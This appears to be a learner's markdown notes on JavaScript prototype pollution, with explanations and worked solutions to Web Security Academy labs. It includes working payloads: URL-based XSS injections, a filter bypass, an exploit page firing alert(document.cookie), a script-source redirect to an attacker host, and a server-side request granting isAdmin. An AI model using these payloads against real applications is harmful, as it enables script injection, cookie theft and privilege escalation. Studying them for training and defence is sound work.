-----------------

#### Prototype Pollution

-----------------

- Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects
- Although, prototype pollution is meant to be chained as a gadget with another vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution.

------------------

### Prototype and Inheritance in Javascript

------------------

- Javascript uses a prototypal-inheritance model compared to class-model used by other programming languages.
- Objects in js-:It consist of `key:value` pair known as properties.e.g

```js
const user = {name: "Andrew",age: 15,role: "admin"};
```

- Access it via bracket notation or dot notation-:

```js
user.name //Andrew
user['name'] //Andrew
```

- As well as data, properties may also contain executable functions. In this case, the function is known as a "method".

```js
const user = {name: "Andrew",age: 15,role: "admin",isAdmin: function() {if (this.role === 'admin'){ return true; } else {return false;}}};
```

- The example above is an "object literal", which means it was created using curly brace syntax to explicitly declare its properties and their initial values. However, it's important to understand that almost everything in JavaScript is an object under the hood. Throughout these materials, the term "object" refers to all entities, not just object literals.

---------------

### Prototype in Javascript

---------------

- Every object in JavaScript is linked to another object of some kind, known as its prototype. By default, JavaScript automatically assigns new objects one of its built-in prototypes. For example, strings are automatically assigned the built-in String.prototype.
- For example-:

```js
let myString = "";
Object.getPrototypeOf(myString); //String
```

- Inheritance way of life in Javascript-: When javascript tries to check a property for an object, it checks if it exists in the object but if it is non-existent, it checks the object's prototype.
- The prototype chain-: Note that an object's prototype is just another object, which should also have its own prototype, and so on. As virtually everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level Object.prototype, whose prototype is simply null.

<img width="838" height="472" alt="image" src="https://github.com/user-attachments/assets/4cfcd0de-8e97-453a-a658-d2e3f5ad89f1" />

- Crucially, objects inherit properties not just from their immediate prototype, but from all objects above them in the prototype chain. In the example above, this means that the username object has access to the properties and methods of both String.prototype and Object.prototype.


---------------

### Accessing an object's prototype using `__proto__`

----------------

- Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, __proto__ is the de facto standard used by most browsers. If you're familiar with object-oriented languages, this property serves as both a getter and setter for the object's prototype. This means you can use it to read the prototype and its properties, and even reassign them if necessary.As with any property, you can access __proto__ using either bracket or dot notation:

```js
let username = "sensei";
username.__proto__; //String.prototype
username.__proto__.__proto__; //Objeect.prototype
username.__proto__.__proto__.__proto__; //null
```

- Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object. This means developers can customize or override the behavior of built-in methods, and even add new methods to perform useful operations.

----------------

### How the vulnerabiity arises

----------------

- It occurs a javascript function recursively merges object controllable user input into an existing object without sanitizing the key.This can allow an attacker to inject a property with a key like __proto__, along with arbitrary nested properties.The merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.
- It is possible to pollute an object but with theh `Object.prototype`.
- Key Components-:
  - A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
  - A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
  - An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

-------------- 

### Components

---------------

- A prototype pollution source is any input that enables you to poison prototype objects with arbitrary properties.
  - The URL via either the query or fragment string (hash)
  - JSON-based input
  - Web messages
 
- Pollution via url-: Example

```url
https://loclahost:5000/?__proto__[evilSink]=payload
```

- You might think that the __proto__ property, along with its nested evilProperty, will just be added to the target object as follows:-:

```js
{__proto__:{evilSink: 'payload' } }
```

- But it'll be like this

```js
targetObject.__proto__.evilSink = payload;
```

- During this assignment, the JavaScript engine treats __proto__ as a getter for the prototype. As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Object.prototype, all objects in the JavaScript runtime will now inherit evilProperty, unless they already have a property of their own with a matching key.
- In practice, injecting a property called evilProperty is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.

- Prototype pollution via JSON input-:
  - User-controllable objects are often derived from a JSON string using the JSON.parse() method. Interestingly, JSON.parse() also treats any key in the JSON object as an arbitrary string, including things like __proto__. This provides another potential vector for prototype pollution.
  - Malicious JSON-:
  ```json
  {
    "__proto__": {
        "evilProperty": "payload"
    }
  }
  ```
  - If this is converted into a JavaScript object via the JSON.parse() method, the resulting object will in fact have a property with the key __proto__:
  ```js
  const objectLiteral = {__proto__: {evilProperty: 'payload'}};
  const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

  objectLiteral.hasOwnProperty('__proto__');     // false
  objectFromJson.hasOwnProperty('__proto__');    // true
  ```
  - If the object created via JSON.parse() is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example.

- A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS.As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.
- An exploitable gadget-: A gadget is a way of turning it into an exploit e.g
  - Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
  - Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

- Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:

```js
let transport_url = config.transport_url || defaults.transport_url;
```
- Now imagine the library code uses this transport_url to add a script reference to the page:

```js
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

- If the website's developers haven't set a transport_url property on their config object, this is a potential gadget. In cases where an attacker is able to pollute the global Object.prototype with their own transport_url property, this will be inherited by the config object and, therefore, set as the src for this script to a domain of the attacker's choosing.
- If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:

```js
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

- By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows:

```js
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```
- Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix.

---------------

### Client Side Prototype Pollution

--------------

- First Challenge-:

```url
https://0a94002a0497549a803b037c00ac00cc.web-security-academy.net/?__proto__[transport_url]=data:,alert(1);//
```
 - Sink/gadget(transport_url ain't defined)-:
```js
let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```
- Pollution source in deparam-:

```js
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );
            keys = keys.shift().split('[').concat( keys );
            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[key] = i < keys_last
                        ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[key].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[key] = [ obj[key], val ];
                } else {
                    obj[key] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
```
- 2nd Challenge(DOM XSS via an alternative prototype pollution vector)-:

```url
https://0a5b009003c8944f805d03a9008e00c1.web-security-academy.net/?__proto__.sequence=%27z%27);alert(1)}%20//
```

- Pollution source-: It has a unique way of parsing url params for setting key and value.e,g

```js
__proto__[sequence]=payload
__proto__.sequence=payload
```

- Source code tidbits-:

```js
// Add an URL parser to JQuery that returns an object
// This function is meant to be used with an URL like the window.location
// Use: $.parseParams('http://mysite.com/?var=string') or $.parseParams() to parse the window.location
// Simple variable:  ?var=abc                        returns {var: "abc"}
// Simple object:    ?var.length=2&var.scope=123     returns {var: {length: "2", scope: "123"}}
// Simple array:     ?var[]=0&var[]=9                returns {var: ["0", "9"]}
// Array with index: ?var[0]=0&var[1]=9              returns {var: ["0", "9"]}
// Nested objects:   ?my.var.is.here=5               returns {my: {var: {is: {here: "5"}}}}
// All together:     ?var=a&my.var[]=b&my.cookie=no  returns {var: "a", my: {var: ["b"], cookie: "no"}}
// You just cant have an object in an array, ?var[1].test=abc DOES NOT WORK
```

- Gadget(window.manager.sequence)-:

```js
window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

```

- Sink to hit xss-:

```js
eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

```

-------------

### Lab-: Client-side prototype pollution via flawed sanitization

--------------

- The js file replaces '__proto__' with empty space ,you can bypass with this `__prot__proto__o__`.Url-:

```
https://0a97007804f29e4e818f84e7005d005f.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1);//
```
- Another way to write `__proto__` is `constructor.prototype`.

```js
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```


--------------

### Using DOM Invader to identify prototype pollution in third party libraries

---------------

- Solution-:

```html
<meta name="referrer" content="never">
<script>
location="https://0a62000303cbd84f8051f313000400dd.web-security-academy.net/chat?constructor[prototype][hitCallback]=alert(document.cookie)&constructor.prototype.hitCallback=alert(document.cookie)&__proto__.hitCallback=alert(document.cookie)&__proto__[hitCallback]=alert(document.cookie)&constrconstructoructor[prototype][hitCallback]=alert(document.cookie)&constrconstructoructor.prototype.hitCallback=alert(document.cookie)&__pro__proto__to__.hitCallback=alert(document.cookie)&__pro__proto__to__[hitCallback]=alert(document.cookie)#constructor[prototype][hitCallback]=alert(document.cookie)&constructor.prototype.hitCallback=alert(document.cookie)&__proto__.hitCallback=alert(document.cookie)&__proto__[hitCallback]=alert(document.cookie)&constrconstructoructor[prototype][hitCallback]=alert(document.cookie)&constrconstructoructor.prototype.hitCallback=alert(document.cookie)&__pro__proto__to__.hitCallback=alert(document.cookie)&__pro__proto__to__[hitCallback]=alert(document.cookie)"
</script>
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```

----------------

### Prototype Pollution Browser APIS

-----------------

- Exploiting `fetch()`-: The Fetch API provides a simple way for developers to trigger HTTP requests using JavaScript. The fetch() method accepts two arguments:The URL to which you want to send the request.An options object that lets you to control parts of the request, such as the method, headers, body parameters, and so on.
- Making a normal `POST` request-:

```js
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```
- As you can see, we've explicitly defined method and body properties, but there are a number of other possible properties that we've left undefined. In this case, if an attacker can find a suitable source, they could potentially pollute Object.prototype with their own headers property. This may then be inherited by the options object passed into fetch() and subsequently used to generate the request.
- Vulnerable code-:

```js
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```
- To exploit this, an attacker could pollute Object.prototype with a headers property containing a malicious x-username header as follows:

```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

- Prototype pollution via `Object.defineProperty()`
- Developers with some knowledge of prototype pollution may attempt to block potential gadgets by using the Object.defineProperty() method. This enables you to set a non-configurable, non-writable property directly on the affected object as follows:
```js
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```
- This may initially seem like a reasonable mitigation attempt as this prevents the vulnerable object from inheriting a malicious version of the gadget property via the prototype chain. However, this approach is inherently flawed.Just like the fetch() method we looked at earlier, Object.defineProperty() accepts an options object, known as a "descriptor". You can see this in the example above. Among other things, developers can use this descriptor object to set an initial value for the property that's being defined. However, if the only reason that they're defining this property is to protect against prototype pollution, they might not bother setting a value at all.In this case, an attacker may be able to bypass this defense by polluting Object.prototype with a malicious value property. If this is inherited by the descriptor object passed to Object.defineProperty(), the attacker-controlled value may be assigned to the gadget property after all.

- Solving the challenge-:Url

```
https://0a0800be0322ce61805912f8004f00fe.web-security-academy.net/?__proto__[value]=data:,alert(1);//
```

- I checked [mozilla](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty) for how `Object.defineProperty()` works.It takes in argument `descriptor` which is an object requiring values passed into keys `value`,`configurable` and `writable`.`Value` allows us to set the defined value of an object's property.If not set, it can lead to prototype pollution and allow an attacker set `value` at `Object.prototype`.Gadget-:

```js
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false}); //value key is not set
```

-----------------

### Server-side Prototype Pollution

-----------------

- Detecting server-side prototype pollution via polluted property reflection

- An easy trap for developers to fall into is forgetting or overlooking the fact that a JavaScript for...in loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain.E.g
  
<img width="1072" height="456" alt="image" src="https://github.com/user-attachments/assets/5b2064f4-e867-4234-812c-ac3c27ba4b48" />

- This also applies to arrays, where a for...in loop first iterates over each index, which is essentially just a numeric property key under the hood, before moving on to any inherited properties as well.

<img width="1049" height="356" alt="image" src="https://github.com/user-attachments/assets/debf59e1-cb7b-4ff9-a65d-b6a301e8edb5" />

- Lab-: Privilege Escalation with Server-Side pollution-:
- Solution-:

```http
POST /my-account/change-address HTTP/2
Host: 0a80008a04aab2458188702000950037.web-security-academy.net
Cookie: session=RpBd2708AlwcHGnQTiusLdpPJW5z02B1
Content-Length: 168
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Brave";v="140"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Gpc: 1
Accept-Language: en-US,en;q=0.8
Origin: https://0a80008a04aab2458188702000950037.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a80008a04aab2458188702000950037.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"RpBd2708AlwcHGnQTiusLdpPJW5z02B1","__proto__":{"isAdmin":true}}
```



-----------------
